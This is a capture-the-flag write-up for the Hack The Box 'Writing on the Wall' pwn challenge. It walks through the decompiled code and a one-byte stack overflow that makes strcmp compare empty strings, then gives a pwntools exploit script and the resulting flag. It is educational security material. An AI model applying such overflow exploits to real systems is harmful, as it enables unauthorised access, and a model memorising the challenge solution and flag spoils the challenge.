# :game_die: HTB: Cyber Apocalypse 2024 - Writing on the Wall

---

# HTB: Cyber Apocalypse 2024 — Writing on the Wall

Difficulty: Very Easy

## Description

As you approach a password-protected door, a sense of uncertainty envelops you — no clues, no hints. Yet, just as confusion takes hold, your gaze locks onto cryptic markings adorning the nearby wall. Could this be the elusive password, waiting to unveil the door’s secrets?

## Protections (checksec)

```
$ checksec
Arch: amd64-64-little
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
RUNPATH: b'./glibc/'
```

As we can see: All protections are enabled.

## The program’s interface

```
〰③ ╤ ℙ Å ⅀ ₷
The writing on the wall seems unreadable, can you figure it out?
>> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[-] You activated the alarm! Troops are coming your way, RUN!
```

## Disassembly (ghidra)

```
undefined8 main(void) {
int iVar1;
long in_FS_OFFSET;
char local_1e [6];
undefined8 local_18;
long local_10;

local_10 = *(long *)(in_FS_OFFSET + 0x28);
local_18 = 0x2073736170743377;
read(0,local_1e,7);
iVar1 = strcmp(local_1e,(char *)&local_18);
if (iVar1 == 0) {
open_door();
}
else {
error("You activated the alarm! Troops are coming your way, RUN!\\n");
}
if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
/* WARNING: Subroutine does not return */
__stack_chk_fail();
}
return 0;
}
```

The program is pretty straightforward. It reads our `7-byte` input at `local_1e` and then it compares it with `local_18` which is the string "w3tpass ".

## Get Szigecsán Dávid’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

The string is `8-bytes` long but we can only enter 7 bytes, meaning we will never be able to pass the comparison.

The `local_1e` variable is stored on `6-byte`, which means we have a `1-byte` overflow to `local_18`.

## Solution (pwntools)

We store a null byte at the start of `local_1e` and overflow another null to `local_18`, so `strcmp()` will compare two empty strings.

```
import argparse
import pwn

parser = argparse.ArgumentParser()
parser.add_argument('--target', '-t', type=str, required=False)
parser.add_argument('--port', '-p', type=str, required=False)
args = parser.parse_args()

p = pwn.remote(args.target, args.port)
p.recv()
p.sendline(b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00')
p.recvuntil(b'next one: ')
flag = p.recv()

pwn.warning('Flag: ' + flag.decode('utf-8'))
```

>> [!] Flag: HTB{3v3ryth1ng_15_r34d4bl3}

## Skills Learned

- buffer overflow

- strcmp() C function

- null strings

---
